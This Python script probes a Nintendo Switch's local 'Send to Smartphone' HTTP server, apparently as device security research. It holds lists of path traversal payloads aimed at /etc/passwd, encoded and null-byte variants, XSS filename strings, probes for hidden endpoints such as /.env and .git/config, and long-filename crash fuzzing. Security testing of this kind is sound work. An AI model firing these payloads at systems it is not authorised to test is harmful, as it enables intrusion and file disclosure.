#!/usr/bin/env python3
"""
Path traversal and directory probing against the Switch HTTP server.

The Switch serves files from /img/<filename> with filenames taken
directly from data.json. The JS uses them unsanitized in src/href.
This tests whether the server resolves path components (../, encoded
variants) or restricts access to certain directories.

Usage:
    1. Put Switch in "Send to Smartphone" mode
    2. Connect PC to the switch_F3DCDB* WiFi AP
    3. Run: python3 -I http_path_traversal.py

Evidence saved to ../evidence/path_traversal/
"""

import socket
import json
import sys
import time
from pathlib import Path
from datetime import datetime, timezone

SWITCH_IP = "192.168.0.1"
SWITCH_PORT = 80
TIMEOUT = 3
EVIDENCE_DIR = Path(__file__).parent.parent / "evidence" / "path_traversal"


def evidence_dir():
    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    return EVIDENCE_DIR


def http_get(path: str, timeout: float = TIMEOUT) -> tuple[int, dict, bytes, float]:
    """GET request, return (status_code, headers_dict, body, elapsed)."""
    req = f"GET {path} HTTP/1.1\r\nHost: {SWITCH_IP}\r\n\r\n".encode()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    t0 = time.monotonic()
    try:
        sock.connect((SWITCH_IP, SWITCH_PORT))
        sock.sendall(req)
        chunks = []
        while True:
            try:
                d = sock.recv(65536)
                if not d:
                    break
                chunks.append(d)
            except socket.timeout:
                break
        elapsed = time.monotonic() - t0
        resp = b"".join(chunks)
        # Parse
        try:
            status = int(resp.split(b" ", 2)[1])
        except (IndexError, ValueError):
            return -1, {}, resp, elapsed
        hdr_end = resp.find(b"\r\n\r\n")
        headers = {}
        if hdr_end > 0:
            for line in resp[:hdr_end].split(b"\r\n")[1:]:
                if b":" in line:
                    k, v = line.split(b":", 1)
                    headers[k.decode().strip().lower()] = v.decode().strip()
            body = resp[hdr_end + 4:]
        else:
            body = b""
        return status, headers, body, elapsed
    except (ConnectionRefusedError, socket.timeout, OSError) as e:
        return -1, {}, str(e).encode(), time.monotonic() - t0
    finally:
        sock.close()


def is_alive() -> bool:
    code, _, _, _ = http_get("/index.html")
    return code == 200


def test_path_traversal():
    """Test directory traversal via ../"""
    print("\n[1] Path Traversal (../)")
    paths = [
        # Basic traversal
        "/img/../index.html",
        "/img/../data.json",
        "/img/../../etc/passwd",
        "/img/../../../etc/passwd",
        # Double-encoded
        "/img/..%2f..%2fetc%2fpasswd",
        "/img/%2e%2e/%2e%2e/etc/passwd",
        "/img/..%252f..%252fetc%252fpasswd",
        # Backslash variants
        "/img/..\\index.html",
        "/img/..\\..\\etc\\passwd",
        # Null byte
        "/img/../index.html%00.jpg",
        "/img/..%00/index.html",
        # Dot variations
        "/img/./index.html",
        "/img/./../index.html",
        "/./img/../index.html",
        "/../index.html",
        "/../../index.html",
        # Try to read known files via traversal
        "/img/../js/index.js",
        "/img/../styles/index.css",
    ]

    results = []
    for path in paths:
        code, hdrs, body, elapsed = http_get(path)
        cl = hdrs.get("content-length", "?")
        ct = hdrs.get("content-type", "?")
        result = {
            "path": path,
            "status": code,
            "content_length": cl,
            "content_type": ct,
            "body_size": len(body),
            "elapsed": round(elapsed, 4),
        }

        # Check if we got actual content (not 404)
        interesting = code == 200 or (code > 0 and code != 404)
        flag = " ⚡" if interesting else ""
        print(f"  {code:4d} CL={cl:>6s} CT={ct:>20s} {path}{flag}")

        if interesting and body:
            result["body_preview"] = body[:200].decode("ascii", errors="replace")

        results.append(result)

    save_results("traversal", results)
    return results


def test_directory_listing():
    """Test if directories return listings."""
    print("\n[2] Directory Listing")
    dirs = [
        "/",
        "/img/",
        "/img",
        "/js/",
        "/js",
        "/styles/",
        "/styles",
        "//",
        "/./",
        "/%2f",
    ]
    results = []
    for path in dirs:
        code, hdrs, body, elapsed = http_get(path)
        cl = hdrs.get("content-length", "?")
        result = {
            "path": path,
            "status": code,
            "content_length": cl,
            "body_size": len(body),
        }
        flag = " ⚡" if code == 200 else ""
        print(f"  {code:4d} CL={cl:>6s} body={len(body):5d}B {path}{flag}")
        if code == 200 and body:
            result["body_preview"] = body[:300].decode("ascii", errors="replace")
        results.append(result)

    save_results("directory_listing", results)
    return results


def test_known_switch_paths():
    """Probe for known Switch system paths that might be accessible."""
    print("\n[3] Known Switch Paths")
    paths = [
        # Horizon OS paths
        "/sdcard/Nintendo/Contents/",
        "/atmosphere/",
        "/switch/",
        "/bootloader/",
        "/sept/",
        # Common embedded server paths
        "/admin",
        "/config",
        "/debug",
        "/status",
        "/info",
        "/api",
        "/api/v1",
        "/version",
        "/health",
        "/metrics",
        # Firmware-related
        "/firmware",
        "/update",
        "/upload",
        "/download",
        # Hidden endpoints
        "/.hidden",
        "/.config",
        "/.env",
        "/robots.txt",
        "/favicon.ico",
        "/sitemap.xml",
        # LDN-specific guesses
        "/ldn",
        "/network",
        "/wireless",
        "/pairing",
        "/qr",
        "/scan",
    ]
    results = []
    for path in paths:
        code, hdrs, body, elapsed = http_get(path)
        cl = hdrs.get("content-length", "?")
        result = {"path": path, "status": code, "content_length": cl}
        interesting = code != 404 and code > 0
        flag = " ⚡ FOUND" if interesting else ""
        print(f"  {code:4d} CL={cl:>6s} {path}{flag}")
        if interesting and body:
            result["body_preview"] = body[:300].decode("ascii", errors="replace")
        results.append(result)

    save_results("known_paths", results)
    return results


def test_method_on_img():
    """Test various methods on the img/ endpoint."""
    print("\n[4] Methods on /img/ Endpoint")
    # First get a valid filename from data.json
    code, _, body, _ = http_get("/data.json")
    if code != 200:
        print("  Cannot fetch data.json — skipping")
        return {}

    try:
        data = json.loads(body)
        filename = data["FileNames"][0]
    except (json.JSONDecodeError, KeyError, IndexError):
        print("  Cannot parse data.json — skipping")
        return {}

    img_path = f"/img/{filename}"
    print(f"  Target: {img_path}")

    methods = ["GET", "HEAD", "POST", "PUT", "DELETE", "PATCH"]
    results = {}
    for method in methods:
        req = f"{method} {img_path} HTTP/1.1\r\nHost: {SWITCH_IP}\r\n\r\n".encode()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        try:
            sock.connect((SWITCH_IP, SWITCH_PORT))
            sock.sendall(req)
            chunks = []
            while True:
                try:
                    d = sock.recv(65536)
                    if not d:
                        break
                    chunks.append(d)
                except socket.timeout:
                    break
            resp = b"".join(chunks)
            try:
                status = int(resp.split(b" ", 2)[1])
            except (IndexError, ValueError):
                status = -1
            results[method] = {"status": status, "resp_bytes": len(resp)}
            print(f"  {method:6s} → {status} ({len(resp)}B)")
        except Exception as e:
            results[method] = {"status": -1, "error": str(e)}
            print(f"  {method:6s} → error: {e}")
        finally:
            sock.close()

    save_results("methods_on_img", results)
    return results


def test_filename_injection():
    """Test what happens with crafted filenames in /img/ path."""
    print("\n[5] Filename Injection via /img/")
    names = [
        # Normal
        "test.jpg",
        # Path components
        "../index.html",
        "../../etc/passwd",
        # URL encoding
        "%2e%2e%2findex.html",
        "..%2findex.html",
        # Null byte
        "test.jpg%00.png",
        "test%00.jpg",
        # Special characters
        "test<script>.jpg",
        'test"onload=alert(1)".jpg',
        "test\x00.jpg",
        # Long filename
        "A" * 256 + ".jpg",
        "A" * 1024 + ".jpg",
        "A" * 4096 + ".jpg",
        # Dot files
        ".htaccess",
        ".git/config",
        # Device files (probably irrelevant on Switch but test anyway)
        "CON",
        "NUL",
    ]
    results = []
    for name in names:
        path = f"/img/{name}"
        code, hdrs, body, elapsed = http_get(path)
        cl = hdrs.get("content-length", "?")

        result = {
            "filename": name[:100],
            "path_length": len(path),
            "status": code,
            "content_length": cl,
            "body_size": len(body),
            "elapsed": round(elapsed, 4),
        }

        interesting = code != 404 and code > 0
        flag = " ⚡" if interesting else ""
        # Special: if 404 body is NOT 117 bytes, that's interesting too
        if code == 404 and cl != "117":
            flag = " ⚠ unusual 404"
            result["unusual_404"] = True

        display_name = name[:50] + "..." if len(name) > 50 else name
        print(f"  {code:4d} CL={cl:>6s} body={len(body):5d}B {display_name}{flag}")

        if code <= 0:
            time.sleep(0.5)
            if not is_alive():
                result["possible_crash"] = True
                print(f"    ⚠ SERVER DOWN — possible crash on filename len={len(name)}")
                break

        results.append(result)

    save_results("filename_injection", results)
    return results


def save_results(name: str, data):
    path = evidence_dir() / f"{name}.json"
    with open(path, "w") as f:
        json.dump({"test": name, "timestamp": datetime.now(timezone.utc).isoformat(),
                    "target": f"{SWITCH_IP}:{SWITCH_PORT}", "results": data}, f, indent=2, default=str)
    print(f"  → saved {path.name}")


def main():
    print("Switch HTTP Path Traversal & Directory Probe")
    print(f"Target: {SWITCH_IP}:{SWITCH_PORT}")
    print(f"Time: {datetime.now(timezone.utc).isoformat()}")
    print("-" * 50)

    if not is_alive():
        print("✗ Server not reachable. Start Send to Smartphone mode.")
        sys.exit(1)
    print("✓ Server alive")

    test_path_traversal()
    test_directory_listing()
    test_known_switch_paths()
    test_method_on_img()
    test_filename_injection()

    print("\n" + "=" * 50)
    print("All probes complete. Check evidence/path_traversal/")
    print("=" * 50)


if __name__ == "__main__":
    main()
